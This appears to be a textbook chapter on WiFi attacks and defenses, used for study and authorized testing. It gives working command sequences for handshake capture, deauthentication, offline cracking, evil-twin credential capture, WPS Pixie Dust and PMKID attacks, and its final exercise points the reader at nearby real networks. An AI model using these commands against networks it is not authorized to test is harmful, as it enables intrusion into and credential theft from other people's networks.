# Chapter 21: Wireless Security — WiFi Attacks and Defenses

*Wireless networks are everywhere, often poorly secured, and physically accessible without entering a building. Understanding WiFi security helps defend corporate networks and test them during engagements.*

---

## WiFi Security Standards

| Standard | Security | Status |
|----------|---------|--------|
| WEP | RC4 + weak IV | BROKEN — crackable in minutes |
| WPA | TKIP | Deprecated — has weaknesses |
| WPA2-Personal | AES-CCMP + PSK | Secure if strong password |
| WPA2-Enterprise | AES-CCMP + 802.1X | Secure — each user has own credentials |
| WPA3 | SAE (Dragonfly) | Current best — resistant to offline attacks |

**Key insight:** WPA2-Personal is only as strong as the password. A weak WiFi password is crackable offline — the attacker just needs to capture the 4-way handshake.

---

## The 4-Way Handshake

WPA2's authentication handshake — capturing this lets you crack offline.

```
Client                          Access Point (AP)
  |                                 |
  | ← ANonce (random nonce) ────── |   Message 1
  |                                 |
  | → SNonce + MIC ─────────────── |   Message 2
  |   (derived from password)       |
  |                                 |
  | ← GTK + MIC ──────────────────  |   Message 3
  |                                 |
  | → ACK ────────────────────────  |   Message 4
  |                                 |
  |===== Connected =================|
```

The MIC (Message Integrity Code) is derived from: PSK + ANonce + SNonce + MAC addresses.

If you capture messages 1+2 (or 2+3), you can brute-force the PSK offline.

---

## Capturing WPA Handshake

```bash
# 1. Put card in monitor mode
sudo airmon-ng check kill        # kill interfering processes
sudo airmon-ng start wlan0       # creates wlan0mon

# 2. Scan for targets
sudo airodump-ng wlan0mon
# Note: BSSID, channel, ESSID of target

# 3. Capture on target channel
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon

# 4. Force clients to re-authenticate (deauth attack)
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
# -0 5 = send 5 deauthentication frames

# 5. Wait for "WPA handshake: AA:BB:CC:DD:EE:FF" in airodump-ng output

# 6. Crack the handshake
aircrack-ng handshake.cap -w /usr/share/wordlists/rockyou.txt

# Faster with hashcat (GPU acceleration)
hcxtools -i handshake.cap -o handshake.hc22000
hashcat -m 22000 handshake.hc22000 /usr/share/wordlists/rockyou.txt
```

---

## Evil Twin Attack

Create a fake access point to steal credentials.

```bash
# hostapd-wpe — fake AP with credential capture
# Create hostapd-wpe.conf:
# interface=wlan0
# driver=nl80211
# ssid=CorporateWiFi
# channel=6
# wpa=2
# wpa_key_mgmt=WPA-EAP
# ...

sudo hostapd-wpe hostapd-wpe.conf
# Captures RADIUS credentials when users connect to "CorporateWiFi"

# bettercap for evil twin
sudo bettercap
# ap.ssid CorporateWiFi
# wifi.ap on
```

---

## WPS Attacks

WPS (WiFi Protected Setup) had a catastrophic design flaw.

```bash
# Check if WPS is enabled and lockout-free
wash -i wlan0mon

# Pixie Dust attack (many routers vulnerable)
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1  # -K 1 = Pixie Dust

# Normal WPS PIN brute force (slow but reliable on vulnerable routers)
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
```

**Why WPS PIN is weak:** 8-digit PIN is actually two independent 4-digit PINs. Only 11,000 combinations instead of 100,000,000.

---

## WPA3 and Modern Defenses

WPA3 fixes the offline cracking problem with SAE (Simultaneous Authentication of Equals):

- No pre-shared key transmitted or derivable from handshake
- Each session uses a unique key — capturing handshake gives nothing
- Forward secrecy

**PMKID attack** — works against some WPA2 networks without clients present:
```bash
hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
hcxtools -i pmkid.pcapng -o pmkid.hc22000
hashcat -m 22000 pmkid.hc22000 wordlist.txt
```

---

## Corporate WiFi Defenses

```
Best practices:
✓ WPA2/WPA3-Enterprise (802.1X) — per-user credentials
✓ Strong PSK (20+ random characters for WPA2-Personal)
✓ Disable WPS
✓ Separate SSID for guests (isolated network)
✓ Wireless IDS (detect rogue APs, deauth storms)
✓ Certificate validation on 802.1X clients (prevent evil twin)
```

---

## Summary

| Attack | Requirement | Tool |
|--------|------------|------|
| WPA2 handshake crack | Capture 4-way handshake | `aircrack-ng`, `hashcat` |
| PMKID attack | No client needed | `hcxdumptool` |
| Deauth | Jam WiFi, force re-auth | `aireplay-ng` |
| Evil twin | RADIUS credential steal | `hostapd-wpe` |
| WPS Pixie Dust | Vulnerable router | `reaver` |

---

## Exercises

1. Set up a WPA2 test network in your lab with a weak password. Capture the handshake and crack it with `rockyou.txt`.
2. What makes WPA3's SAE handshake resistant to offline dictionary attacks?
3. Explain why client certificate validation is essential for 802.1X WiFi against evil twin attacks.
4. Use `wash` to scan for WPS-enabled networks in your area. How many are vulnerable?
